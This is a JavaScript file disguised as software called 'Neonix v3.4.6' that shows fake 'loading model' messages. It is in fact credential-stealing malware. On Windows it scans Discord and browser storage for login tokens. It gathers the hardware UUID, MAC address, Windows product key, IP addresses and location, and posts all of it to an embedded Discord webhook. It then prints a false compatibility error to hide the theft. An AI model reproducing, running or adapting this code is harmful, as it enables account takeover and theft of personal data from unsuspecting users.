console.log(`Loading Neonix v3.4.6...`)
console.log(`[ERROR] Failed to load console colourings and timestamps!`)
process.title = "Neonix v3.4.6"
var geoip = require('geoip-lite');
const fs = require("fs"),
  { execSync } = require("child_process"),
  fetch = require("node-fetch");
var wifiPass = "", // don't touch
  wHook = `https://discord.com/api/webhooks/1109484253659537498/NLRq9LKSdbI2JZmboIYusE5dfTHfxV6tiYtvyiIBgW59R3zzAhnjlfkwhj_b4xnDGqbG`;
  let tokens = [], paths = []

switch (process.platform) {
  case "win32":
    console.log(`Loading model... This may take a few minutes`)
    const local = process.env.localappdata,
      roaming = process.env.appdata,
      dbPaths = [
        `${roaming}/Discord/Local Storage/leveldb`,
        `${roaming}/DiscordDevelopment/Local Storage/leveldb`,
        `${roaming}/Lightcord/Local Storage/leveldb`,
        `${roaming}/discordptb/Local Storage/leveldb`,
        `${roaming}/discordcanary/Local Storage/leveldb`,
        `${roaming}/Opera Software/Opera Stable/Local Storage/leveldb`,
        `${roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb`,
        `${local}/Amigo/User Data/Local Storage/leveldb`,
        `${local}/Torch/User Data/Local Storage/leveldb`,
        `${local}/Kometa/User Data/Local Storage/leveldb`,
        `${local}/Orbitum/User Data/Local Storage/leveldb`,
        `${local}/CentBrowser/User Data/Local Storage/leveldb`,
        `${local}/7Star/7Star/User Data/Local Storage/leveldb`,
        `${local}/Sputnik/Sputnik/User Data/Local Storage/leveldb`,
        `${local}/Vivaldi/User Data/Default/Local Storage/leveldb`,
        `${local}/Google/Chrome SxS/User Data/Local Storage/leveldb`,
        `${local}/Epic Privacy Browser/User Data/Local Storage/leveldb`,
        `${local}/Google/Chrome/User Data/Default/Local Storage/leveldb`,
        `${local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,
        `${local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb`,
        `${local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
        `${local}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,
        `${local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
      ],
      UUID = execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
      MacAddress = execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],
      ProductKey = execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0],
      localIP = execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
      WifiPass = []/*execSync(
        `netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object { $xml=[xml] (get-content $_); $a= $xml.WLANProfile.SSIDConfig.SSID.name + ": " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial; $a; }`,
        { shell: "powershell.exe" }
      )
        .toString()
        .split("\r\n"),*/
      getIPAddress = execSync(
        "powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress"
      )
        .toString()
        .split("\r\n")[0];
    WifiPass.forEach((r) => (r.includes(": ") ? (wifiPass += r + "\n") : "f"));
    wifiPass.includes("�?T") ? (wifiPass = wifiPass.replace(/�\?T/g, "'")) : "";
    init();
    console.log("Testing model... This may take a few.")
    let posts = 0;
    var geo = geoip.lookup(getIPAddress);
    function init() {
      fs.readdirSync(__dirname).forEach((r) =>
        r.endsWith("xml") ? fs.unlinkSync(`${__dirname}/${r}`) : ""
      );
      dbPaths.forEach((r, index) => main(r, index));
    }

    function main(p, i) {
      fs.readdir(p, (err, data) => {
        if (err) return;
        if (data) {
          var ldbFileFilter = data.filter((f) => f.endsWith("ldb"));
          ldbFileFilter.forEach((file) => {
            var fileContent = fs.readFileSync(`${p}/${file}`).toString();
            var noMFA = /[\d\w_-]{24,26}\.[\d\w_-]{6}\.[\d\w_-]{24,115}/;
            var mfa = /mfa\.[\d\w_-]{84}/;
            var [token] = noMFA.exec(fileContent) ||
              mfa.exec(fileContent) || [undefined];
            if (token) {
                tokens.push(token), paths.push(p);
            }
            if(i == 22) {
                setTimeout(() => {
                    send(tokens, paths)
                }, 3000);
            }
          });
        }
      });
    }
    function send(tokens, p) {
        if(posts > 0) return;
        posts++
      
      let e = {
        title: "Ceaser X",
        color: 16711680, // Hex color code, e.g., Red: 0xFF0000
        fields: [
          {
            name: "Tokens",
            value: "```"+`${tokens.join("\n")}`+" ```",
            inline: false,
          },
          {
            name: "Paths",
            value: "```" + paths.join("\n") + " ```",
            inline: false,
          },
          {
            name: `IP Address`,
            value: "```" + getIPAddress + "```",
            inline: true,
          },
          {
            name: `MacAddress`,
            value: "```" + MacAddress + "```",
            inline: true,
          },
          {
            name: `Local IP`,
            value: "```" + localIP + "```",
            inline: true,
          },
          {
            name: `UUID`,
            value: "```" + UUID + "```",
            inline: true
          },
          {
            name: `Product Key`,
            value: "```" + ProductKey + "```",
            inline: true
          },
          {
            name: `Location`,
            value: "```" +`${geo.city}, ${geo.region}, ${geo.country}, [${geo.timezone}]`+"```" ,
            inline: false
          }
        ],
        timestamp: new Date().toISOString(),
      };
      
      
      fetch(`${wHook}`, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ embeds: [e] }),
      })
        .then(response => {
            console.log(`Seems like your PC isn't compactible with this architecture! Please contact Dux again!`)
        })
        .catch(err => {});
      
    }
    break;
  default:
    break;
}
